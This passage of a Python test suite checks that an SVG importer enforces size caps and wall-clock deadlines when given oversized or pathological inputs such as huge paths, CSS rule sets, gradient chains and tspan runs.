        css = "".join(rng.choice("ab.#{} ;:\n") for _ in range(rng.randint(0, 30)))
        got = [
            (r.tag, r.classes, r.ident, tuple(sorted(r.decls)))
            for r in svgimport.parse_css(css, {}, 0)
        ]
        want = []
        for sels, body in _old_parse_css_rules(css):
            decls = svgimport._parse_decls(body)
            for sel in sels.split(","):
                sel = sel.strip()
                m = svgimport._SIMPLE_SEL.match(sel) if sel else None
                if not m or (not m.group(1) and not m.group(2)):
                    continue
                import re

                parts = re.findall(r"([.#])([\w-]+)", m.group(2))
                ids = [n for k, n in parts if k == "#"]
                want.append(
                    (
                        m.group(1),
                        tuple(n for k, n in parts if k == "."),
                        ids[0] if ids else None,
                        tuple(sorted(decls)),
                    )
                )
        assert got == want, css


def test_import_with_trailing_css_whitespace_stays_within_the_wall_clock(monkeypatch):
    monkeypatch.setattr(svgimport, "DEADLINE_S", 0.3)
    text = SVG.format("<style>a{}" + " " * 60_000 + "</style>")
    t0 = time.monotonic()
    outcome(text)
    assert time.monotonic() - t0 < 0.3 + 1.0


def test_css_selector_count_is_capped():
    css = ",".join(["a"] * (svgimport.MAX_CSS_SELECTORS + 5)) + "{fill:red}"
    with pytest.raises(svgimport.SvgImportError) as e:
        svgimport.parse_css(css, {}, 0)
    assert e.value.code == "too_many_elements"


# ---- Codex 线程 4656811236：渐变色标 × 样式级联 ----


def test_stops_times_rules_stop_at_the_deadline(monkeypatch):
    """9000 条 `stop{}` 规则 × 1000 个色标（色标上限以内）：每个色标都要扫一遍规则表，原来不查墙钟、数秒后成功返回
    （Codex 原例是 2000 规则 × 1 万色标，16 秒；现在色标数超过上限直接拒）"""
    monkeypatch.setattr(svgimport, "DEADLINE_S", 0.3)
    stops = '<stop offset="0"/>' * 1_000
    rules = "stop{stop-color:red}" * 9_000
    text = SVG.format(
        f"<style>{rules}</style><defs><linearGradient id='g'>{stops}</linearGradient></defs>"
        '<rect width="5" height="5" fill="url(#g)"/>'
    )
    t0 = time.monotonic()
    got = outcome(text)
    assert time.monotonic() - t0 < 0.3 + 1.0
    assert got in (("rejected", "timeout"), ("ok", ""))


def test_gradient_stop_count_is_capped():
    stops = '<stop offset="0"/>' * (svgimport.MAX_STOPS + 1)
    text = SVG.format(
        f"<defs><linearGradient id='g'>{stops}</linearGradient></defs>"
        '<rect width="5" height="5" fill="url(#g)"/>'
    )
    assert outcome(text) == ("rejected", "too_many_elements")
    ok = '<stop offset="0"/><stop offset="1" stop-color="red"/>' * 10
    text = SVG.format(
        f"<defs><linearGradient id='g'>{ok}</linearGradient></defs>"
        '<rect width="5" height="5" fill="url(#g)"/>'
    )
    assert outcome(text) == ("ok", "")


def test_gradient_stops_are_computed_once_per_gradient(monkeypatch):
    """50 个图形引用同一个渐变：色标只过一遍样式级联（以前每个图形重算）"""
    calls = []
    real = svgimport._computed

    def spy(el, parent, ctx):
        calls.append(svgimport._local(el.tag))
        return real(el, parent, ctx)

    monkeypatch.setattr(svgimport, "_computed", spy)
    text = SVG.format(
        "<defs><linearGradient id='g'><stop offset='0' stop-color='red'/><stop offset='1' stop-color='blue'/>"
        "</linearGradient></defs>" + '<rect width="5" height="5" fill="url(#g)"/>' * 50
    )
    r = svgimport.import_svg(text)
    assert len(r["objects"]) == 50 and all("fillGradient" in o for o in r["objects"])
    assert calls.count("stop") == 2


def test_gradient_href_inheritance_semantics():
    """属性取自己的、色标取 href 链上第一个有色标的（引用环 svgcheck 在前面就拒了，这里不会走到）"""
    text = SVG.format(
        '<defs><linearGradient id="a" x2="0.5" xlink:href="#b"/>'
        '<linearGradient id="b"><stop offset="0" stop-color="red"/><stop offset="1" stop-color="blue"/></linearGradient></defs>'
        '<rect width="10" height="10" fill="url(#a)"/>'
    )
    r = svgimport.import_svg(text)
    g = r["objects"][0]["fillGradient"]
    assert [s["color"] for s in g["stops"]] == ["#ff0000", "#0000ff"]
    assert g["to"][0] == pytest.approx(0.5, abs=0.02)


def test_long_gradient_href_chain_does_not_recurse():
    n = 500
    grads = "".join(f'<linearGradient id="g{i}" xlink:href="#g{i + 1}"/>' for i in range(n))
    grads += f'<linearGradient id="g{n}"><stop offset="0"/><stop offset="1" stop-color="red"/></linearGradient>'
    r = svgimport.import_svg(
        SVG.format(f'<defs>{grads}</defs><rect width="5" height="5" fill="url(#g0)"/>')
    )
    assert len(r["objects"]) == 1  # 链太长（超过跳数上限）：当没有色标，纯色退化，不崩


# ---- Codex 线程 4656811239：tspan 文字分段收集后一次 join ----


def test_tspan_runs_keep_their_text_and_order():
    body = (
        '<text x="1" y="5">a<tspan>b</tspan>c<tspan x="2" y="6">d</tspan><tspan>e</tspan>f</text>'
    )
    r = svgimport.import_svg(SVG.format(body))
    assert [(o["text"]) for o in r["objects"]] == ["abc", "def"]


def test_tspan_loop_checks_the_wall_clock():
    from xml.etree import ElementTree as ET

    el = ET.fromstring('<text x="1" y="5">' + "<tspan>a</tspan>" * 2000 + "</text>")
    ctx = svgimport._Ctx(ids={}, rules=[], deadline=time.monotonic() - 1)
    with pytest.raises(svgimport.SvgImportError) as e:
        svgimport._emit_text(el, {}, svgimport.IDENTITY, ctx, [], 1.0)
    assert e.value.code == "timeout"


def test_many_tspans_are_joined_in_linear_time(monkeypatch):
    """4 万个 80 字符 tspan：以前 `ptxt + text` 每次复制全文（Codex 实测 7 秒）；这里只核成功时结果正确且在预算内"""
    monkeypatch.setattr(svgimport, "DEADLINE_S", 120.0)
    n = 40_000
    text = SVG.format('<text x="1" y="5">x' + ("<tspan>" + "a" * 80 + "</tspan>") * n + "</text>")
    t0 = time.monotonic()
    r = svgimport.import_svg(text)
    assert time.monotonic() - t0 < 5.0
    assert len(r["objects"][0]["text"]) == 1 + 80 * n


# ---- 第三轮：短墙钟参数化（与机器快慢无关）----
# 墙钟压到 0.3 秒、输入放大到接近预算上限：任何一个不查墙钟的循环都会表现成「耗时远超墙钟」。
# 允许的结局：正常成功 / 做不准 / timeout / too_many_elements / too_large；不允许的是挂很久。

SHORT_DEADLINE_S = 0.3
SHORT_MARGIN_S = 2.0
#: 计时用**本进程 CPU 时间**（`time.process_time`），不用墙钟：CI runner 被抢 CPU 时，墙钟里会混进排队等 CPU 的时间
#: （小输入、解析单位≈0 时照样 1.30 s 被踢，#2035 合并组 clip-many-children）；真正漏查墙钟的循环会实打实烧 CPU
#: （修前 4 s 到 500 s 以上），按 CPU 时间照样抓得住。被测代码自己的墙钟只会让它更早停，不会让 CPU 时间变长
#: 余量还要随本机速度放大：墙钟查不进去的那几段（C 的 XML 解析、解析前对全文的正则扫描）耗时与机器快慢成正比，
#: 负载高的 CI 分片上一份 1.7 MB 的输入光这些就能吃掉 1 秒（#2034 合并组 3.13 分片 1.30 s 被踢）。
#: 以「同一份输入不带任何检查直接解析一遍」的耗时作单位：真正漏查墙钟的循环是超线性的（修前 4 s 到 500 s 以上），照样抓得住
SHORT_CALIBRATION_FACTOR = 5.0


def _parse_unit(text: str) -> float:
    """本机把这份输入直接交给 XML 解析器（不经任何预算、墙钟检查）要多久：两次取快的那次"""
    from xml.etree import ElementTree as ET

    data = text.encode()
    best = float("inf")
    for _ in range(2):
        t0 = time.process_time()
        try:
            ET.fromstring(data)
        except ET.ParseError:
            pass
        best = min(best, time.process_time() - t0)
    return best


_OK_CODES = {"timeout", "too_many_elements", "too_large"}
_XMLNS = 'xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"'


def _svg(body: str, extra: str = "") -> str:
    return f'<svg {_XMLNS} viewBox="0 0 10 10" {extra}>{body}</svg>'


def _stops_case() -> str:
    stops = '<stop offset="0"/>' * 10_000
    rules = "stop{stop-color:red}" * 9_000
    return _svg(
        f"<style>{rules}</style><defs><linearGradient id='g'>{stops}</linearGradient></defs>"
        '<rect width="5" height="5" fill="url(#g)"/>'
    )


def _stop_rect_many_case() -> str:
    stops = '<stop offset="0"/><stop offset="1"/>' * 20
    return _svg(
        f"<defs><linearGradient id='g'>{stops}</linearGradient></defs>"
        + '<rect width="5" height="5" fill="url(#g)"/>' * 4_000
    )


def _gradient_chain_case() -> str:
    n = 550  # 首尾相连的渐变链：svgcheck 的展开计数是链长的平方，再长就被 too_large 先拒了
    grads = "".join(f'<linearGradient id="g{i}" xlink:href="#g{i + 1}"/>' for i in range(n))
    grads += f'<linearGradient id="g{n}"><stop offset="0"/><stop offset="1" stop-color="red"/></linearGradient>'
    return _svg(f'<defs>{grads}</defs><rect width="5" height="5" fill="url(#g0)"/>')


def _deep_groups_case() -> str:
    return _svg("<g>" * 60 + '<rect width="1" height="1"/>' * 40_000 + "</g>" * 60)


def _tspans(inner: str, n: int) -> str:
    return _svg(f'<text x="1" y="5">x{inner * n}</text>')


_SHORT_CASES = {
    "path-L-chain": lambda: _svg('<path d="M0 0' + " L1 1" * 90_000 + '" fill="red"/>'),
    "path-repeat-M": lambda: _svg('<path d="' + "M0 0 L1 1 " * 150_000 + '" fill="red"/>'),
    "path-only-M": lambda: _svg('<path d="' + "M0 0 " * 380_000 + '" fill="red"/>'),
    "path-curves": lambda: _svg('<path d="M0 0' + " C1 1 2 2 3 3" * 90_000 + '" fill="red"/>'),
    "path-arcs": lambda: _svg('<path d="M0 0' + " A5 5 0 0 1 10 10" * 90_000 + '" fill="red"/>'),
    "path-Z": lambda: _svg('<path d="' + "M0 0 Z " * 280_000 + '" fill="red"/>'),
    "polyline": lambda: _svg('<polyline points="' + "0,0 1,1 " * 45_000 + '" fill="red"/>'),
    "polygon-big": lambda: _svg('<polygon points="' + "0,0 1,1 " * 240_000 + '" fill="red"/>'),
    "rects": lambda: _svg('<rect width="1" height="1" class="a"/>' * 45_000),
    "circles": lambda: _svg('<circle r="1" style="fill:red"/>' * 45_000),
    "use-many": lambda: _svg(
        '<defs><g id="p">'
        + '<rect width="1" height="1"/>' * 10
        + "</g></defs>"
        + '<use href="#p"/>' * 15_000
    ),
    "use-chain-fanout": lambda: _svg(
        '<defs><g id="a"><rect width="1" height="1"/></g>'
        + "".join(
            f'<g id="b{i}"><use href="#{"a" if i == 0 else f"b{i - 1}"}"/><use href="#{"a" if i == 0 else f"b{i - 1}"}"/></g>'
            for i in range(15)
        )
        + '</defs><use href="#b10"/>'
    ),
    "css-rules-many-elements": lambda: _svg(
        "<style>"
        + "".join(f".c{i}{{fill:red}}" for i in range(9_999))
        + "</style>"
        + '<rect width="1" height="1" class="c5"/>' * 40_000
    ),
    "css-tail-spaces": lambda: _svg("<style>a{}" + " " * 4_000_000 + "</style>"),
    "css-selector-commas": lambda: _svg(
        "<style>" + "a," * 1_900_000 + "a{fill:red}</style><rect width='1' height='1'/>"
    ),
    "css-decl-many": lambda: _svg(
        "<style>a{" + "fill:red;" * 400_000 + "}</style><rect width='1' height='1'/>"
    ),
    "tspan-merge": lambda: _tspans("<tspan>" + "a" * 80 + "</tspan>", 40_000),
    "tspan-xy": lambda: _tspans('<tspan x="1" y="2">' + "a" * 20 + "</tspan>", 40_000),
    "tspan-tail": lambda: _tspans("<tspan>a</tspan>" + "t" * 40, 40_000),
    "tspan-with-css": lambda: _svg(
        "<style>"
        + "".join(f".c{i}{{fill:red}}" for i in range(5_000))
        + "</style>"
        + '<text x="1" y="5">'
        + '<tspan class="c1">ab</tspan>' * 40_000
        + "</text>"
    ),
    "stops-x-rules": _stops_case,
    "stops-rect-many": _stop_rect_many_case,
    "gradient-href-chain": _gradient_chain_case,
    "deep-groups-many-shapes": _deep_groups_case,
    "metadata-mix": lambda: (
        f'<svg {_XMLNS} xmlns:x="urn:x" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" viewBox="0 0 10 10">'
        + "<metadata><rdf:RDF/></metadata><x:foo><x:bar/></x:foo><rect width='1' height='1'/>"
        * 9_000
        + "</svg>"
    ),
    "transform-list": lambda: _svg(
        '<rect width="1" height="1" transform="' + "translate(1 2) " * 400_000 + '"/>'
    ),
    "transform-letters": lambda: _svg(
        '<rect width="1" height="1" transform="' + "a" * 7_000_000 + '"/>'
    ),
    "long-number": lambda: _svg("", f'width="{"9" * 7_000_000}!"'),
    "style-attr-many": lambda: _svg(
        '<rect width="1" height="1" style="fill:red;stroke:blue;opacity:.5"/>' * 45_000
    ),
    "style-attr-huge": lambda: _svg(
        '<rect width="1" height="1" style="' + "fill:red;" * 700_000 + '"/>'
    ),
    "class-attr-huge": lambda: _svg(
        '<rect width="1" height="1" class="' + "a " * 3_000_000 + '"/>' * 1
    ),
    "dasharray-huge": lambda: _svg(
        '<rect width="1" height="1" stroke="red" stroke-dasharray="' + "1 " * 3_000_000 + '"/>'
    ),
    "clip-many-children": lambda: _svg(
        '<defs><clipPath id="c">'
        + '<rect width="1" height="1"/>' * 380
        + "</clipPath></defs>"
        + '<rect width="1" height="1" clip-path="url(#c)"/>' * 380
    ),
    "viewbox-nums": lambda: f'<svg {_XMLNS} viewBox="{"1 " * 3_000_000}"/>',
}


@pytest.mark.parametrize("name", sorted(_SHORT_CASES))
def test_short_wall_clock_bounds_every_construction(name, monkeypatch):
    """墙钟压到 0.3 秒：不管哪一类放大到接近预算上限，`import_svg` 都必须在「墙钟 + 余量」内返回或抛出"""
    monkeypatch.setattr(svgimport, "DEADLINE_S", SHORT_DEADLINE_S)
    text = _SHORT_CASES[name]()
    assert len(text.encode()) <= svgimport.MAX_BYTES, "构造超过了 MAX_BYTES：先调小再比"
    unit = _parse_unit(text)
    w0, c0 = time.monotonic(), time.process_time()
    try:
        r = svgimport.import_svg(text)
        got = "ok" if not r["unsupported"] else "unsupported"
    except svgimport.SvgImportError as e:
        got = e.code
        assert got in _OK_CODES, got
    cpu, wall = time.process_time() - c0, time.monotonic() - w0
    allowed = SHORT_DEADLINE_S + SHORT_MARGIN_S + SHORT_CALIBRATION_FACTOR * unit
    assert cpu <= allowed, (
        f"{name}: CPU {cpu:.2f}s / 墙钟 {wall:.2f}s ({got}), 允许 {allowed:.2f}s（解析单位 {unit:.3f}s）"
    )


# ---- 第三轮枚举补充：没有墙钟可查的循环要么设上限、要么查墙钟 ----


def test_transform_attribute_is_capped():
    with pytest.raises(svgimport.SvgImportError) as e:
        svgimport.parse_transform("a" * (svgimport.MAX_TRANSFORM_CHARS + 1))
    assert e.value.code == "too_many_elements"
    with pytest.raises(svgimport.SvgImportError):
        svgimport.parse_transform("scale(1) " * (svgimport.MAX_TRANSFORM_CALLS + 1))
    assert (
        svgimport.parse_transform("scale(1) " * svgimport.MAX_TRANSFORM_CALLS) == svgimport.IDENTITY
    )


def test_number_lists_are_capped():
    with pytest.raises(svgimport.SvgImportError) as e:
        svgimport._nums("1 " * svgimport.MAX_PATH_D_CHARS)
    assert e.value.code == "too_many_elements"
    assert svgimport._nums("1 2 3") == [1, 2, 3]


def test_dasharray_item_count_is_capped():
    ctx = svgimport._Ctx(ids={}, rules=[], deadline=time.monotonic() + 60)
    ok = svgimport._paint_fields(
        {"stroke": "red", "stroke-dasharray": "2 1"},
        ctx,
        svgimport.IDENTITY,
        (0, 0, 1, 1),
        (0, 0, 1, 1),
        1.0,
        1.0,
    )
    assert "dashPattern" in ok
    big = "1 " * (svgimport.MAX_DASH_ITEMS + 1)
    out = svgimport._paint_fields(
        {"stroke": "red", "stroke-dasharray": big},
        ctx,
        svgimport.IDENTITY,
        (0, 0, 1, 1),
        (0, 0, 1, 1),
        1.0,
        1.0,
    )
    assert "dashPattern" not in out


def test_polyline_point_count_is_refused_before_building_nodes():
    from xml.etree import ElementTree as ET

    ctx = svgimport._Ctx(ids={}, rules=[], deadline=time.monotonic() + 60)
    el = ET.fromstring('<polyline points="' + "1,1 " * (svgimport.MAX_ANCHORS + 1) + '"/>')
    with pytest.raises(svgimport.SvgImportError) as e:
        svgimport._geometry_raw(el, "polyline", ctx)
    assert e.value.code == "too_many_elements"


def test_post_processing_loops_check_the_wall_clock():
    past = time.monotonic() - 1
    nodes = [{"p": (i, i), "in": (i, i), "out": (i, i)} for i in range(5000)]
    subs = [{"closed": False, "nodes": nodes}]
    for call in (
        lambda: svgimport._transform_subs(subs, svgimport.IDENTITY, past),
        lambda: svgimport.fit_box(subs, past),
        lambda: svgimport.path_object(subs, past),
    ):
        with pytest.raises(svgimport.SvgImportError) as e:
            call()
        assert e.value.code == "timeout"
    objs = [{"id": f"o{i}", "groupId": "g1"} for i in range(10_000)]
    with pytest.raises(svgimport.SvgImportError) as e:
        svgimport._prune_groups(objs, past)
    assert e.value.code == "timeout"


def test_svgcheck_declaration_loops_check_the_wall_clock():
    past = time.monotonic() - 1
    body = "fill:red;" * 2000
    with pytest.raises(svgcheck.SVGError) as e:
        svgcheck._declarations(body, past)
    assert e.value.code == "svg_timeout"
    with pytest.raises(svgcheck.SVGError):
        svgcheck._drop_inert(body, past)
    assert svgcheck._drop_inert("overflow:hidden;fill:red") == "fill:red"


def test_reference_graph_walk_checks_the_wall_clock():
    """引用环检测的全图遍历（`svgcheck._references`）也按间隔查墙钟：墙钟已过时，几千个节点的图在遍历中途就报超时，
    不等整张图走完（#2034 合并组 rects 用例在慢 runner 上超时后多等了 1 秒）"""
    n = 5000
    nodes = list(range(n))
    edges = [[i + 1] if i + 1 < n else [] for i in range(n)]
    with pytest.raises(svgcheck.SVGError) as ei:
        svgcheck._references(nodes, edges, {}, {}, svgcheck.SVGBudget(), deadline=0.0)
    assert ei.value.code == "svg_timeout"


def test_style_cascade_checks_the_wall_clock_per_rule_batch():
    """一个元素对整张规则表逐条比的级联（`_computed`）也按规则数查墙钟：墙钟已过时，规则一多当场报超时"""
    from xml.etree import ElementTree as ET

    rules = svgimport.parse_css("".join(f".c{i}{{fill:red}}" for i in range(1000)), {})
    ctx = svgimport._Ctx(ids={}, rules=rules, deadline=0.0)
    el = ET.Element("rect", {"class": "c1"})
    with pytest.raises(svgimport.SvgImportError) as ei:
        svgimport._computed(el, {}, ctx)
    assert ei.value.code == "timeout"
